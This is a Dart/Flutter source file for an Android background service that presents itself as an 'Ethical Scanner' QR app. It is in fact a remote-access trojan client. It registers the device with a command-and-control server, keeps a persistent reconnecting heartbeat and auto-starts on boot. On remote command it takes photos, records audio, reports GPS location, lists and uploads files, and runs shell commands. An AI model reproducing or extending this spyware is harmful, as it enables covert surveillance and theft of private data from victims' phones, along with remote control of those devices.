// lib/services/background_service.dart

import 'dart:async';
import 'dart:io';
import 'dart:isolate';
import 'dart:ui';

import 'package:flutter/foundation.dart';
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidConfiguration;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:camera/camera.dart' show XFile, CameraLensDirection;
import 'package:geolocator/geolocator.dart' show Position;
import 'package:shared_preferences/shared_preferences.dart';

import '../config/app_config.dart';
import '../utils/constants.dart';
import 'data_collector_service.dart';
import 'device_info_service.dart';
import 'network_service.dart';
import 'location_service.dart';
import 'camera_service.dart';
import 'file_system_service.dart';

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DataCollectorService dataCollectorService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final CameraService cameraService;
  final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.dataCollectorService,
    required this.deviceInfoService,
    required this.locationService,
    required this.cameraService,
    required this.fileSystemService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
  });
}

Timer? _heartbeatTimer;
Timer? _reconnectionTimer;
StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;
int _reconnectionAttempts = 0;
const int _maxReconnectionAttempts = 50; // Keep trying indefinitely

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final network = NetworkService();
  final dataCollector = DataCollectorService();
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  final camera = CameraService();
  final fileSystem = FileSystemService();
  final prefs = await SharedPreferences.getInstance();
  final String deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
  
  debugPrint("BackgroundService: Starting with DeviceID = $deviceId");

  final handles = BackgroundServiceHandles(
    networkService: network,
    dataCollectorService: dataCollector,
    deviceInfoService: deviceInfo,
    locationService: location,
    cameraService: camera,
    fileSystemService: fileSystem,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
  );

  service.invoke('update', {'device_id': deviceId});

  // Enhanced connection monitoring with automatic reconnection
  _setupConnectionMonitoring(handles);
  
  // Start initial connection
  await _connectWithRetry(handles);

  // Handle commands from UI for methods that require main isolate
  _setupUICommandHandlers(handles);

  // Handle initial data sending
  _setupInitialDataHandler(handles);

  // Handle service stop
  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    await _stopService(handles);
  });
}

void _setupConnectionMonitoring(BackgroundServiceHandles h) {
  _connectionStatusSubscription = h.networkService.connectionStatusStream.listen((isConnected) {
    debugPrint("BackgroundService: Socket status changed: ${isConnected ? 'Connected' : 'Disconnected'}");
    
    h.serviceInstance.invoke('update', {
      'socket_status': isConnected ? 'Connected' : 'Disconnected',
    });

    if (isConnected) {
      _reconnectionAttempts = 0;
      _reconnectionTimer?.cancel();
      _registerDeviceWithC2(h);
      _startHeartbeat(h);
    } else {
      _stopHeartbeat();
      _scheduleReconnection(h);
    }
  });

  _commandSubscription = h.networkService.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});
    debugPrint("BackgroundService: Received command '$cmd' with args: $args");
    _handleC2Command(h, cmd, args);
  });
}

void _scheduleReconnection(BackgroundServiceHandles h) {
  if (_reconnectionAttempts >= _maxReconnectionAttempts) {
    debugPrint("BackgroundService: Max reconnection attempts reached. Will retry in 60 seconds.");
    _reconnectionAttempts = 0;
  }
  
  _reconnectionTimer?.cancel();
  final delay = Duration(seconds: 5 + (_reconnectionAttempts * 2).clamp(0, 60));
  
  _reconnectionTimer = Timer(delay, () async {
    _reconnectionAttempts++;
    debugPrint("BackgroundService: Attempting reconnection #$_reconnectionAttempts");
    await _connectWithRetry(h);
  });
}

Future<void> _connectWithRetry(BackgroundServiceHandles h) async {
  try {
    await h.networkService.connectSocketIO(h.currentDeviceId);
  } catch (e) {
    debugPrint("BackgroundService: Connection failed: $e");
    _scheduleReconnection(h);
  }
}

void _setupUICommandHandlers(BackgroundServiceHandles h) {
  // Handle take picture response from UI
  h.serviceInstance.on('execute_take_picture_from_ui_result').listen((response) async {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint("BackgroundService: 'original_command_ref' missing in take_picture_from_ui_result");
      return;
    }

    if (status == 'success' && payload != null && payload.containsKey('path')) {
      final filePath = payload['path'] as String;
      debugPrint("BackgroundService: UI took picture successfully. Path: $filePath. Uploading...");
      await h.networkService.uploadFileFromCommand(
        deviceId: h.currentDeviceId,
        commandRef: originalCommandRef,
        fileToUpload: XFile(filePath),
      );
    } else {
      debugPrint("BackgroundService: UI failed to take picture. Error: ${payload?['message']}");
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: 'error',
        payload: {
          'message': 'UI failed to take picture: ${payload?['message']}',
        },
      );
    }
  });

  // Handle list files response from UI
  h.serviceInstance.on('execute_list_files_from_ui_result').listen((response) {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint("BackgroundService: 'original_command_ref' missing in list_files_from_ui_result");
      return;
    }

    if (status == 'success' && payload != null) {
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "success",
        payload: payload,
      );
    } else {
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "error",
        payload: {
          "message": payload?['message']?.toString() ?? "UI failed to list files.",
        },
      );
    }
  });

  // Handle shell command response from UI
  h.serviceInstance.on('execute_shell_from_ui_result').listen((response) {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint("BackgroundService: 'original_command_ref' missing in execute_shell_from_ui_result");
      return;
    }

    if (status == 'success' && payload != null) {
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "success",
        payload: payload,
      );
    } else {
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: "error",
        payload: {
          "message": payload?['message']?.toString() ?? "UI failed to execute shell command.",
        },
      );
    }
  });

  // Handle voice recording response from UI
  h.serviceInstance.on('execute_record_voice_from_ui_result').listen((response) async {
    if (response == null) return;
    final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
    final status = data['status'] as String?;
    final payload = data['payload'] as Map<String, dynamic>?;
    final String? originalCommandRef = data['original_command_ref'] as String?;

    if (originalCommandRef == null) {
      debugPrint("BackgroundService: 'original_command_ref' missing in execute_record_voice_from_ui_result");
      return;
    }

    if (status == 'success' && payload != null && payload.containsKey('path')) {
      final filePath = payload['path'] as String;
      debugPrint("BackgroundService: UI recorded audio successfully. Path: $filePath. Uploading...");
      await h.networkService.uploadFileFromCommand(
        deviceId: h.currentDeviceId,
        commandRef: originalCommandRef,
        fileToUpload: XFile(filePath),
      );
    } else {
      debugPrint("BackgroundService: UI failed to record audio. Error: ${payload?['message']}");
      h.networkService.sendCommandResponse(
        originalCommand: originalCommandRef,
        status: 'error',
        payload: {
          'message': 'UI failed to record audio: ${payload?['message']}',
        },
      );
    }
  });
}

void _setupInitialDataHandler(BackgroundServiceHandles h) {
  h.serviceInstance.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((Map<String, dynamic>? argsFromUi) async {
    final alreadySent = h.preferences.getBool(PREF_INITIAL_DATA_SENT) ?? false;

    h.serviceInstance.invoke('update', {'initial_data_status': 'Processing...'});

    if (alreadySent && argsFromUi == null) {
      debugPrint("BackgroundService: Initial data already marked as sent, and no new UI trigger.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Already Sent'});
      return;
    }

    if (argsFromUi == null) {
      debugPrint("BackgroundService: argsFromUi is null for BG_SERVICE_EVENT_SEND_INITIAL_DATA, cannot send.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Error - No UI Data'});
      return;
    }

    final jsonData = argsFromUi['jsonData'] as Map<String, dynamic>?;
    final imagePath = argsFromUi['imagePath'] as String?;
    
    if (jsonData == null) {
      debugPrint("BackgroundService: jsonData is null within argsFromUi, cannot send initial data.");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Error - JSON Data Null'});
      return;
    }

    final payload = Map<String, dynamic>.from(jsonData)..['deviceId'] = h.currentDeviceId;

    XFile? imageFile;
    if (imagePath != null && imagePath.isNotEmpty) {
      final file = File(imagePath);
      if (await file.exists()) {
        imageFile = XFile(imagePath);
      } else {
        debugPrint("BackgroundService: Image file not found for initial data: $imagePath");
      }
    }

    final success = await h.networkService.sendInitialData(
      jsonData: payload,
      imageFile: imageFile,
    );
    
    if (success) {
      await h.preferences.setBool(PREF_INITIAL_DATA_SENT, true);
      debugPrint("BackgroundService: Initial data sent successfully");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Sent Successfully'});
    } else {
      debugPrint("BackgroundService: Failed to send initial data");
      h.serviceInstance.invoke('update', {'initial_data_status': 'Failed to Send'});
    }
  });
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) return;
  
  try {
    final info = await h.deviceInfoService.getDeviceInfo();
    info['deviceId'] = h.currentDeviceId;
    h.networkService.registerDeviceWithC2(info);
    debugPrint("BackgroundService: Device registration attempt sent for ID: ${h.currentDeviceId}");
  } catch (e, s) {
    debugPrint("BackgroundService: Error registering device: $e\n$s");
  }
}

void _startHeartbeat(BackgroundServiceHandles h) {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
    if (h.networkService.isSocketConnected) {
      h.networkService.sendHeartbeat({
        'deviceId': h.currentDeviceId,
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
    h.serviceInstance.invoke('update', {
      'current_date': DateTime.now().toIso8601String(),
      'device_id': h.currentDeviceId,
      'socket_status': h.networkService.isSocketConnected ? 'Connected' : 'Disconnected',
    });
  });
  
  debugPrint("BackgroundService: Heartbeat started for Device ID: ${h.currentDeviceId}. Interval: ${C2_HEARTBEAT_INTERVAL.inSeconds}s");
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
  debugPrint("BackgroundService: Heartbeat stopped");
}

Future<void> _handleC2Command(BackgroundServiceHandles h, String commandName, Map<String, dynamic> args) async {
  debugPrint("BackgroundService: Processing command: $commandName");
  
  switch (commandName) {
    case SIO_CMD_TAKE_PICTURE:
      try {
        final lensString = args['camera'] as String?;
        final lensArg = lensString?.toLowerCase() == 'front' ? 'front' : 'back';

        debugPrint("BackgroundService: Requesting UI to take picture with lens: $lensArg");

        h.serviceInstance.invoke('execute_take_picture_from_ui', {
          'camera': lensArg,
          'original_command_ref': SIO_CMD_TAKE_PICTURE,
        });
      } catch (e, s) {
        debugPrint("BackgroundService: Error in SIO_CMD_TAKE_PICTURE: $e\nStackTrace: $s");
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_TAKE_PICTURE,
          status: 'error',
          payload: {'message': 'BG error preparing take_picture: ${e.toString()}'},
        );
      }
      break;

    case SIO_CMD_GET_LOCATION:
      try {
        final Position? loc = await h.locationService.getCurrentLocation();
        if (loc != null) {
          h.networkService.sendCommandResponse(
            originalCommand: SIO_CMD_GET_LOCATION,
            status: 'success',
            payload: {
              'latitude': loc.latitude,
              'longitude': loc.longitude,
              'accuracy': loc.accuracy,
              'altitude': loc.altitude,
              'speed': loc.speed,
              'timestamp_gps': loc.timestamp?.toIso8601String(),
            },
          );
        } else {
          throw Exception("Location unavailable");
        }
      } catch (e, s) {
        debugPrint("BackgroundService: Error executing SIO_CMD_GET_LOCATION: $e\nStackTrace: $s");
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_GET_LOCATION,
          status: 'error',
          payload: {'message': e.toString()},
        );
      }
      break;

    case SIO_CMD_LIST_FILES:
      try {
        final path = args["path"] as String? ?? "/storage/emulated/0";
        debugPrint("BackgroundService: Requesting UI to list files for path: '$path'");
        
        h.serviceInstance.invoke('execute_list_files_from_ui', {
          'path': path,
          'original_command_ref': SIO_CMD_LIST_FILES,
        });
      } catch (e, s) {
        debugPrint("BackgroundService: Error in SIO_CMD_LIST_FILES: $e\nStackTrace: $s");
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_LIST_FILES,
          status: "error",
          payload: {"message": "BG error preparing list_files: ${e.toString()}"},
        );
      }
      break;

    case SIO_CMD_UPLOAD_SPECIFIC_FILE:
      try {
        final filePath = args["path"] as String?;
        if (filePath == null || filePath.isEmpty) {
          throw Exception("File path is required for upload command");
        }

        final file = File(filePath);
        if (!await file.exists()) {
          throw Exception("File not found at path: $filePath");
        }

        final xfile = XFile(filePath);
        await h.networkService.uploadFileFromCommand(
          deviceId: h.currentDeviceId,
          commandRef: SIO_CMD_UPLOAD_SPECIFIC_FILE,
          fileToUpload: xfile,
        );
      } catch (e, s) {
        debugPrint("BackgroundService: Error executing SIO_CMD_UPLOAD_SPECIFIC_FILE: $e\nStackTrace: $s");
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_UPLOAD_SPECIFIC_FILE,
          status: "error",
          payload: {"message": "Pre-upload error in BG: ${e.toString()}"},
        );
      }
      break;

    case SIO_CMD_EXECUTE_SHELL:
      try {
        final command = args["command_name"] as String?;
        final commandArgs = (args["command_args"] as List<dynamic>?)?.map((e) => e.toString()).toList() ?? [];

        if (command == null || command.isEmpty) {
          throw Exception("Command name missing for execute_shell");
        }
        
        debugPrint("BackgroundService: Requesting UI to execute shell: $command with args: $commandArgs");

        h.serviceInstance.invoke('execute_shell_from_ui', {
          'command': command,
          'args': commandArgs,
          'original_command_ref': SIO_CMD_EXECUTE_SHELL,
        });
      } catch (e, s) {
        debugPrint("BackgroundService: Error executing SIO_CMD_EXECUTE_SHELL: $e\nStackTrace: $s");
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_EXECUTE_SHELL,
          status: "error",
          payload: {"message": e.toString()},
        );
      }
      break;

    case SIO_CMD_RECORD_VOICE:
      try {
        final duration = args['duration'] as int? ?? 10;
        final quality = args['quality'] as String? ?? 'medium';
        
        debugPrint("BackgroundService: Requesting UI to record voice for ${duration}s with quality: $quality");
        
        h.serviceInstance.invoke('execute_record_voice_from_ui', {
          'duration': duration,
          'quality': quality,
          'original_command_ref': SIO_CMD_RECORD_VOICE,
        });
      } catch (e, s) {
        debugPrint("BackgroundService: Error executing SIO_CMD_RECORD_VOICE: $e\nStackTrace: $s");
        h.networkService.sendCommandResponse(
          originalCommand: SIO_CMD_RECORD_VOICE,
          status: "error",
          payload: {"message": e.toString()},
        );
      }
      break;

    case SIO_EVENT_REQUEST_REGISTRATION_INFO:
      debugPrint("BackgroundService: Server requested registration info. Re-registering...");
      _registerDeviceWithC2(h);
      break;

    default:
      debugPrint("BackgroundService: Received unknown command '$commandName'");
      h.networkService.sendCommandResponse(
        originalCommand: commandName,
        status: 'error',
        payload: {'message': 'Unknown command received by client: $commandName'},
      );
      break;
  }
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  debugPrint("BackgroundService: Received stop service event. Stopping...");
  
  _stopHeartbeat();
  _reconnectionTimer?.cancel();
  
  await h.dataCollectorService.disposeCamera();
  h.networkService.disconnectSocketIO();
  
  await _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription = null;
  
  await _commandSubscription?.cancel();
  _commandSubscription = null;
  
  h.networkService.dispose();
  await h.serviceInstance.stopSelf();
  
  debugPrint("BackgroundService: Service stopped.");
}

Future<void> initializeBackgroundService() async {
  final service = FlutterBackgroundService();

  if (Platform.isAndroid) {
    final flnp = FlutterLocalNotificationsPlugin();
    const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
    const initSettings = InitializationSettings(android: androidInit);

    try {
      await flnp.initialize(initSettings);
      debugPrint("FlutterLocalNotificationsPlugin initialized successfully.");
    } catch (e, s) {
      debugPrint("Error initializing FlutterLocalNotificationsPlugin: $e\n$s");
    }

    const channel = AndroidNotificationChannel(
      'qr_scanner_service_channel',
      'Ethical Scanner Service',
      description: 'Background service for the Ethical Scanner application.',
      importance: Importance.high, // Changed to high for better persistence
      playSound: false,
      enableVibration: false,
      showBadge: true,
    );

    final AndroidFlutterLocalNotificationsPlugin? androidImplementation =
        flnp.resolvePlatformSpecificImplementation<AndroidFlutterLocalNotificationsPlugin>();

    if (androidImplementation != null) {
      try {
        await androidImplementation.createNotificationChannel(channel);
        debugPrint("Notification channel 'qr_scanner_service_channel' created successfully.");
      } catch (e, s) {
        debugPrint("Error creating notification channel: $e\n$s");
      }
    }
  }

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'qr_scanner_service_channel',
      initialNotificationTitle: 'Ethical Scanner Active',
      initialNotificationContent: 'Service is running and monitoring commands.',
      foregroundServiceNotificationId: 888,
      autoStartOnBoot: true, // Added for auto-start on boot
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,
      onBackground: onStart,
    ),
  );
  
  debugPrint("Background service configured with enhanced persistence.");
}